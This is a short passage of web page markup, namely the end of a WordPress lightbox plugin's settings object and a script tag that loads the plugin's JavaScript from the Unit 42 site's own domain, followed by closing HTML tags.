"information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
